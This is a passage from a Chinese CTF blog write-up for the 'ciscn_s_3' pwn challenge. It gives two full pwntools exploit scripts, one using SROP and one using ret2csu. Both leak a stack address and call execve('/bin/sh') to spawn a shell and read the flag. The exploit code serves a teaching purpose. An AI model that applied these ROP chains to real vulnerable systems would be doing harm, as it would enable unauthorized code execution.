<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(bdrAddr)</span><br><span class="line">payload += p64(syscall_retAddr)</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>这样就能拿到flag了：</p>
<p><img src="/images/writeup/4/final.png" alt="final"></p>
<p>这种情况的完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">binary = <span class="string">&#x27;../ciscn_s_3&#x27;</span></span><br><span class="line">elf =ELF(binary)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">port = <span class="number">29144</span></span><br><span class="line">ip = <span class="string">&quot;61.147.171.105&quot;</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = <span class="string">b&quot;ls &amp;&amp; cat flag&quot;</span></span><br><span class="line"><span class="comment">#==================rop==================#</span></span><br><span class="line">mainAddr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">bdrAddr = <span class="number">0x4004d7</span></span><br><span class="line">syscall_retAddr = <span class="number">0x0000000000400517</span></span><br><span class="line"><span class="comment">#=================start=================#</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span></span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stackAddr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x138</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(stackAddr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">0x3b</span></span><br><span class="line">sigframe.rdi = stackAddr  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stackAddr</span><br><span class="line">sigframe.rip = syscall_retAddr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload += p64(bdrAddr)</span><br><span class="line">payload += p64(syscall_retAddr)</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#=================End=================#</span></span><br><span class="line">p.sendline(<span class="built_in">next</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>对于后者，我们需要利用系统调用execve，不但要把rdi指向binsh地址，还需要将rsi和rdx全都置0；</p>
<p><img src="/images/writeup/4/7.png" alt="7"></p>
<p>ROPgadget无法找到rdx相关的gadget（根本没有），因此我们选择使用ret2csu：</p>
<p><img src="/images/writeup/4/csu.png" alt="csu"></p>
<p>这里参考了一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bhxdn/p/12715671.html">这个write up</a>：注意这里是edi而不是rdi，64位传参的地址需要8位寄存器，这个edi是不够的，因此我们还需要rdi来传参：</p>
<p><img src="/images/writeup/4/8.png" alt="8"></p>
<p>第二个payload构造如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span></span><br><span class="line">payload += p64(bdrAddr)</span><br><span class="line">payload += p64(csuEnd)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(stackAddr + <span class="number">0x10</span>)<span class="comment">#r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#edi</span></span><br><span class="line">payload += p64(csuStart)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(stackAddr)</span><br><span class="line">payload += p64(syscall_retAddr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>这种也可以拿到flag。完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">binary = <span class="string">&#x27;../ciscn_s_3&#x27;</span></span><br><span class="line">elf =ELF(binary)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">port = <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = <span class="string">b&quot;ls &amp;&amp; cat flag&quot;</span></span><br><span class="line"><span class="comment">#==================rop==================#</span></span><br><span class="line">mainAddr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">bdrAddr = <span class="number">0x4004d7</span></span><br><span class="line">rdiAddr = <span class="number">0x00000000004005a3</span></span><br><span class="line"><span class="comment">#pop rdi;ret</span></span><br><span class="line">syscall_retAddr = <span class="number">0x0000000000400517</span></span><br><span class="line">csuStart = <span class="number">0x400580</span></span><br><span class="line">csuEnd = <span class="number">0x40059a</span></span><br><span class="line"><span class="comment">#=================start=================#</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span></span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stackAddr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x138</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(stackAddr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span></span><br><span class="line">payload += p64(bdrAddr)</span><br><span class="line">payload += p64(csuEnd)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(stackAddr + <span class="number">0x10</span>)<span class="comment">#r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#edi</span></span><br><span class="line">payload += p64(csuStart)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(stackAddr)</span><br><span class="line">payload += p64(syscall_retAddr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#=================End=================#</span></span><br><span class="line">p.sendline(<span class="built_in">next</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">NazrinDuck</p>
  <div class="site-description" itemprop="description">Fâtih'in İstanbul'u fethettiği yaştasın!</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">NazrinDuck</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
